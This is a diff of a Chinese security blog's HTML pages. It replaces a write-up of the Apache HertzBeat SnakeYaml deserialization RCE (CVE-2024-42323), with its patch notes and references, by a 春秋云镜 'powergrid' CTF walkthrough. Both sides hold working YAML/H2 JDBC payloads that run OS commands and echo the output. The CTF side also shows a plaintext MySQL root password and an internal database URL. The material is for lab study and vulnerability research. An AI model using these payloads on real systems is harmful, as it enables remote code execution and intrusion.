-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">jdbc:h2:mem:test</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">MODE:</span> <span class="string">MSSQLServer</span></span><br><span class="line">  <span class="attr">INIT:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    DROP ALIAS IF EXISTS EXEC;</span></span><br><span class="line"><span class="string">    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());&#125;$$;</span></span><br><span class="line"><span class="string">    CALL EXEC ();</span></span><br><span class="line"><span class="string"></span><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br><span class="line"><span class="bullet">-</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202505598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202505598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310202505598"></p>
+<p>administrator文件夹有flag</p>
+<p><code>C:\Users\Administrator\Desktop\larkmt-admin\conf\application.yml</code> 发现数据库信息，用的mysql</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202845688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202845688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310202845688"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: root</span><br><span class="line">password: rjS8K2RW7KE4E1vk</span><br><span class="line">url: jdbc:mysql://172.16.200.81:3306/web?serverTimezone=Asia/Shanghai&amp;useLegacyDatetimeCode=false&amp;useSSL=false&amp;nullNamePatternMatchesAll=true&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417170824468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417170824468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="type">!!org.dromara.hertzbeat.manager.service.impl.AbstractImExportServiceImpl$ExportMonitorDTO</span></span><br><span class="line">  <span class="attr">detected:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">basic</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">performance</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">innodb</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">status</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">handler</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">connection</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">thread</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">tmp</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">select_type</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">sort</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">table_lock</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">process_state</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">slow_sql</span></span><br><span class="line">  <span class="attr">monitor:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">collector:</span> <span class="literal">null</span></span><br><span class="line">    <span class="attr">description:</span> <span class="type">!!org.h2.jdbc.JdbcConnection</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jdbc:h2:mem:test</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">MODE:</span> <span class="string">MSSQLServer</span></span><br><span class="line">        <span class="attr">INIT:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          DROP ALIAS IF EXISTS EXEC;</span></span><br><span class="line"><span class="string">          CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;</span></span><br><span class="line"><span class="string">            org.springframework.util.StreamUtils.copy(</span></span><br><span class="line"><span class="string">              java.lang.Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream(),</span></span><br><span class="line"><span class="string">              ((org.springframework.web.context.request.ServletRequestAttributes)</span></span><br><span class="line"><span class="string">                org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()</span></span><br><span class="line"><span class="string">              ).getResponse().getOutputStream()</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">          &#125;$$;</span></span><br><span class="line"><span class="string">          CALL EXEC ();</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">a</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">b</span></span><br><span class="line">      <span class="bullet">-</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">any</span></span><br><span class="line">    <span class="attr">intervals:</span> <span class="number">60</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">MYSQL_any</span></span><br><span class="line">    <span class="attr">status:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">any</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">port</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">database</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">any</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">username</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">admin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">password</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">1VoUqkaf3xVudnLjC1gtzw==</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">timeout</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">&#x27;6000&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">url</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="literal">null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>回过头来看在v1.4.1 commit内修改的黑名单禁用ScriptEngineManager和URLClassLoader和SnakeYaml版本号毫无卵用</p>
-<p>在v1.6.0版本中，Hertzbeat最终通过增加<code>SafeConstructor</code>修复了这个问题：<a target="_blank" rel="noopener" href="https://github.com/apache/hertzbeat/pull/1611%E3%80%82">https://github.com/apache/hertzbeat/pull/1611。</a></p>
-<p>或者更新SnakeYaml&gt;&#x3D;2.0也可以</p>
-<p>REF：</p>
-<p><a target="_blank" rel="noopener" href="https://forum.butian.net/article/612">https://forum.butian.net/article/612</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/hertzbeat/CVE-2024-42323/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/hertzbeat/CVE-2024-42323/README.zh-cn.md</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96">https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html">https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203100002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203100002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310203100002"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203230981.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203230981.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310203230981"></p>
+<p>自己md5吧，溜了，做一下两年没做过的排序去</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/SnakYaml/" class="">
-              SnakYaml
+            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="">
+              春秋云镜
             </a>
           
         </div>
@@ -728,7 +717,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2025/04/17/apache-hertzbeat-snakeyaml-fan-xu-lie-hua/" target="_blank" title="Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）">https://godownio.github.io/2025/04/17/apache-hertzbeat-snakeyaml-fan-xu-lie-hua/</a>
+    <a href="/2026/03/10/chun-qiu-yun-jing-powergrid/" target="_blank" title="春秋云镜 powergrid">https://godownio.github.io/2026/03/10/chun-qiu-yun-jing-powergrid/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -746,40 +735,24 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2025/04/17/tomcat-xia-classpathxmlapplicationcontext-de-bu-chu-wang-li-yong/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">Tomcat下ClassPathXmlApplicationContext的不出网利用</div>
-      </div>
-      
-      <!-- <div class="content">
-        依旧来自p神的Springboot Code-Breaking 2025小挑战https://github.com/ph
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8190.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8190.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2025/04/15/shiro-fan-xu-lie-hua-tu-po-chang-du-xian-zhi/" class="post-nav-link">
+    <a href="/2026/01/21/chun-qiu-yun-jing-aoselu/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">Shiro反序列化突破长度限制</div>
+        <div class="title-text">春秋云镜 Aoselu</div>
       </div>
       <!-- <div class="content">
-        Shiro反序列化突破长度限制来源于hw面试官的问题，shiro rememberMe限制了Header长度怎么办
-首先
+        春秋云镜 Aoseluflag139.99.144.221
+题目有hint
+
+&#114;&#x61;&#99;&#10
       </div> -->
     </a>
   </div>
@@ -1000,7 +973,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-HertzBeat-SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-42323%EF%BC%89"><span class="toc-text">Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring%E4%B8%8B%E7%9A%84SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Spring下的SnakeYaml反序列化</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-powergrid"><span class="toc-text">春秋云镜 powergrid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
